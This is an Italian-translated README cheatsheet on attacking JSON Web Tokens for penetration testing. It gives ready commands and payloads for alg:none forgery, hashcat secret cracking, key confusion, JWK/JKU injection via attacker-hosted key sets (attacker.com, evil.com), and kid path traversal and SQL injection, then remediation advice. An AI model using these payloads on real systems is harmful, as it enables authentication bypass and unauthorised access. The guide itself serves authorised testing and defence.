<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ Attacchi JWT - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<palign="centro">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Attacchi chiave">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Test API">
</p>

<palign="centro">
  <b>🛡️ Metodologia completa e comandi pratici per sfruttare le vulnerabilità JSON Web Token (JWT)</b>
</p>

---

## 📋 Sommario

- [Introduzione e anatomia di un JWT](#-introduzione--anatomia-di-un-jwt)
- [Strumenti di test essenziali](#-essential-testing-tools)
- [Matrice di vulnerabilità e vettori di attacco](#-vulnerability-matrix--attack-vettori)
  - [1. Nessuno difetto algoritmo (`alg: "none"`)](#1-none-algoritmo-difetto-alg-none)
  - [2. Cracking segreto HMAC debole (HS256)](#2-weak-hmac-secret-cracking-hs256)
  - [3. Confusione algoritmo/Confusione tasti (RS256 -> HS256)](#3-confusione-algoritmo--confusione-tasti-rs256---hs256)
  - [4. Inserimento intestazione JWK (chiave Web JSON)](#4-jwk-json-web-key-header-injection)
  - [5. Configurazione errata JKU (URL set JWK) e SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. Manipolazione e iniezioni di intestazione KID (ID chiave)](#6-kid-key-id-header-manipulation--injection)
  - [7. Inoltro tra servizi e perdita di dati sensibili](#7-inoltro tra servizi--fuga-di-dati-sensibili)
- [Automazione dei test con `jwt_tool`](#-automating-tests-with-jwt_tool)
- [Cracking dei segreti JWT con Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Risanamento e implementazione sicura](#-risanamento--implementazione-sicura)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione e anatomia di un JWT

Un **JSON Web Token (JWT)** è un mezzo compatto e sicuro per gli URL per rappresentare rivendicazioni tra due parti. Comunemente utilizzato per l'autenticazione della sessione nelle moderne API REST, applicazioni a pagina singola (SPA) e microservizi.

Un JWT standard è costituito da tre parti con codifica Base64URL separate da punti (`.`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **Intestazione:** Identifica il tipo di token e l'algoritmo crittografico utilizzato (ad esempio, `HS256`, `RS256`, `none`).
2. **Payload:** Contiene le richieste (ad esempio, `user_id`, `role`, scadenza `exp`). *Nota: i payload sono codificati, NON crittografati!*
3. **Firma:** creata eseguendo l'hashing dell'intestazione e del payload codificati utilizzando una chiave segreta o privata.

---

## 🛠️ Strumenti di test essenziali

1. **jwt_tool:** toolkit da riga di comando per analizzare, testare e crackare i JWT.
2. **Hashcat:** Cracking segreto HMAC veloce basato su GPU (modalità `16500`).
3. **Estensione Burp Suite:** "JWT Editor" di Fraser Winterborn (nel BApp Store di PortSwigger).

### Installazione di `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Matrice delle vulnerabilità e vettori di attacco

### 1. Nessuno difetto dell'algoritmo (`alg: "none"`)

**Meccanismo:**
Alcune librerie di verifica JWT considerano i token validi se l'intestazione `alg` è impostata su `none`, ignorando completamente la verifica della firma.

**Sfruttamento:**
1. Decodificare l'intestazione e modificare `"alg": "HS256"` in `"alg": "none"`.
2. Modificare le dichiarazioni sul carico utile (ad esempio, `"role": "admin"`).
3. Rimuovi la parte della firma (mantieni il punto finale!).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Struttura token manuale:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Cracking segreto HMAC debole (HS256)

**Meccanismo:**
Se il server firma i token utilizzando algoritmi simmetrici (`HS256`, `HS384`, `HS512`) con una chiave segreta indovinabile o debole (ad esempio, `secret`, `admin123`, nome dell'azienda), un utente malintenzionato può forzare il segreto offline e firmare token arbitrari.

**Cracking con Hashcat:**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
**Forgiare token dopo il cracking:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Confusione di algoritmi/Confusione di tasti (RS256 -> HS256)

**Meccanismo:**
- **RS256 (Asimmetrico):** Firmato con la chiave privata del server; verificato con la **chiave pubblica** del server.
- **HS256 (simmetrico):** Firmato e verificato con lo **stesso segreto condiviso**.

Se la libreria backend non applica rigorosamente i tipi di algoritmo, un utente malintenzionato può:
1. Ottieni la chiave pubblica del server (spesso esposta pubblicamente su `/.well-known/jwks.json` o certificati).
2. Modificare l'intestazione dell'algoritmo del token da `RS256` a `HS256`.
3. Firma il token modificato con la **chiave pubblica** del server come segreto HMAC!
4. Il server riceve il token, vede `HS256` e verifica la firma utilizzando la chiave di verifica configurata (che è la sua chiave pubblica), risultando in una firma valida!

**Sfruttamento tramite `jwt_tool`:**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. Iniezione di intestazione JWK (chiave Web JSON).

**Meccanismo:**
La specifica JWT consente una chiave pubblica incorporata nel parametro dell'intestazione `jwk`. I server vulnerabili si affidano a questa chiave di intestazione per verificare la firma senza verificare se la chiave appartiene a una CA attendibile o a una whitelist pre-condivisa.

**Sfruttamento:**
1. Genera una coppia di chiavi RSA dell'attaccante.
2. Incorpora la chiave pubblica nell'intestazione `jwk`.
3. Firma il token con la chiave privata corrispondente.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. Configurazione errata JKU (URL impostato JWK) e SSRF

**Meccanismo:**
L'intestazione `jku` (JWK Set URL) specifica un URL remoto da cui il server deve recuperare la chiave pubblica impostata per verificare il token.

**Sfruttamento:**
1. Ospita il tuo `jwks.json` su un server web dell'attaccante:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Modifica l'intestazione del token:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Firma il token con la tua chiave privata.

> **Ignorare le whitelist degli URL:**
> Se l'applicazione convalida i suffissi di dominio, prova i reindirizzamenti aperti o le peculiarità dell'analisi degli URL:
> - `https://trusted.com@attacker.com/jwks.json`
> - `https://trusted.com.attacker.com/jwks.json`
> - Apri reindirizzamento: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. Manipolazione e iniezioni di intestazioni KID (ID chiave).

L'intestazione `kid` è una stringa utilizzata per identificare quale chiave deve essere caricata da un database o filesystem.

#### A. Attraversamento della directory su file vuoto (`/dev/null`)
Se il server legge il file della chiave dal disco utilizzando `kid`:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Firma il token con un segreto vuoto (`""` / 0 byte)!

#### B. SQL Iniezione tramite KID
Se il server recupera il segreto da un database:
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Iniettare una stringa statica nota:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Firma il token utilizzando il segreto `'my_known_secret'`.

---

### 7. Inoltro tra servizi e perdita di dati sensibili

- **PII non crittografati:** gli sviluppatori spesso archiviano password, SSN o metadati utente sensibili nel payload, dimenticando che è solo codificato Base64URL e non crittografato.
- **Confusione di servizi:** utilizzo di un token destinato a un servizio con privilegi limitati (ad esempio, API di analisi) rispetto a un'API amministrativa interna.

---

## ⚡ Automatizzazione dei test con `jwt_tool`

### Esegui tutti gli attacchi Playbook integrati
Il modo più semplice per scansionare automaticamente tutte le vulnerabilità conosciute:
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Modalità manomissione interattiva
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Scoprire i segreti JWT con Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Tabella di consultazione rapida

| Vulnerabilità | Tecnica di attacco | Carico utile / bandiera chiave |
|---------------|--------------------|--------------------|
| **Nessuno Algoritmo** | Imposta `alg: "none"`, firma a striscia | `jwt_tool <TOKEN> -X a` |
| **Segreto debole** | Dizionario GPU forza bruta | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Confusione sugli algoritmi**| Cambia RS256 in HS256, firma con chiave pubblica | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **Iniezione JWK** | Incorpora la chiave pubblica dell'aggressore nell'intestazione | `jwt_tool <TOKEN> -X i` |
| **Iniezione JKU** | Puntare `jku` al server esterno | `"jku": "http://evil.com/jwks.json"` |
| **Attraversamento del percorso KID**| Puntare da `kid` a `/dev/null` o file conosciuto | `"kid": "/dev/null"` (Firma con `""`) |
| **KID SQLi** | Iniettare il segreto statico nella query SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Risanamento e implementazione sicura

1. **Algoritmi di whitelist espliciti:**
   Non consentire mai la selezione `alg` controllata dal client. Gli algoritmi consentiti dall'hardcode sul server (ad esempio, consentono esclusivamente `RS256`).
2. **Rifiuta token `alg: none`:**
   Assicurati che la libreria rifiuti rigorosamente i token non verificati o non firmati.
3. **Utilizza segreti lunghi e crittograficamente sicuri:**
   I segreti HMAC devono contenere almeno 256 bit (32+ caratteri casuali) generati da un CSPRNG sicuro.
4. **Convalida le intestazioni `jku` e `jwk`:**
   Recupera solo i set JWK da una rigorosa lista bianca di URL interni attendibili; rifiutare i domini esterni forniti dall'utente.
5. **Igienizza valori `kid`:**
   Tratta `kid` come input di un utente non attendibile; disinfettare contro l'attraversamento delle directory (`../`) e l'iniezione SQL.

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** gli attacchi JWT possono portare al bypass completo dell'autenticazione e all'accesso non autorizzato ai database delle applicazioni. Questa guida è strettamente intesa per scopi didattici e test di penetrazione autorizzati.

---

## 📚 Risorse

- [Repository GitHub jwt_tool](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: attacchi JWT](https://portswigger.net/web-security/jwt)
- [RFC 7519 - Standard JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)